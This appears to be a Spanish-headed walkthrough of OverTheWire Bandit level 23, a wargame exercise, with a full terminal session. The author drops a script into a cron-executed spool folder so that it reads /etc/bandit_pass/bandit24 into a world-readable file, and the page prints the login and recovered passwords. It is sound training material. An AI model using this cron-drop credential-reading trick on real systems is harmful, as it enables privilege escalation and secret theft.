# Bandit Level

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solucion
```bash
bandit23@bandit:~$ mkdir /tmp/Oss
bandit23@bandit:~$ cd /tmp/Oss
bandit23@bandit:/tmp/Oss$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/Oss/password"
 > mix2.sh
bandit23@bandit:/tmp/Oss$ chmod 777 mix2.sh
bandit23@bandit:/tmp/Oss$ touch password
bandit23@bandit:/tmp/Oss$ chmod 666 password
bandit23@bandit:/tmp/Oss$ cd -
/home/bandit23
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -la
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  8 12:09 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:/etc/cron.d$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /tmp/Oss
bandit23@bandit:/tmp/Oss$ cp mix2.sh /var/spool/$myname/foo
cp: cannot create regular file '/var/spool//foo': Permission denied
bandit23@bandit:/tmp/Oss$ cp mix2.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/Oss$ ls -la
total 240
drwxrwxr-x    2 bandit23 bandit23   4096 Sep 11 03:08 .
drwxrwx-wt 3826 root     root     229376 Sep 11 03:11 ..
-rwxrwxrwx    1 bandit23 bandit23     51 Sep 11 03:08 mix2.sh
-rwxrwxrwx    1 bandit23 bandit23     42 Sep 11 03:07 mix.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep 11 03:08 password
bandit23@bandit:/tmp/Oss$
bandit23@bandit:/tmp/Oss$ ls -la
total 240
drwxrwxr-x    2 bandit23 bandit23   4096 Sep 11 03:08 .
drwxrwx-wt 3826 root     root     229376 Sep 11 03:11 ..
-rwxrwxrwx    1 bandit23 bandit23     51 Sep 11 03:08 mix2.sh
-rwxrwxrwx    1 bandit23 bandit23     42 Sep 11 03:07 mix.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep 11 03:08 password
bandit23@bandit:/tmp/Oss$ date
Sun Sep 11 03:13:01 AM UTC 2022
bandit23@bandit:/tmp/Oss$ ls -la
total 244
drwxrwxr-x    2 bandit23 bandit23   4096 Sep 11 03:08 .
drwxrwx-wt 3826 root     root     229376 Sep 11 03:13 ..
-rwxrwxrwx    1 bandit23 bandit23     51 Sep 11 03:08 mix2.sh
-rwxrwxrwx    1 bandit23 bandit23     42 Sep 11 03:07 mix.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Sep 11 03:12 password
bandit23@bandit:/tmp/Oss$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/Oss$

```
## Notas adicionales

## Referencias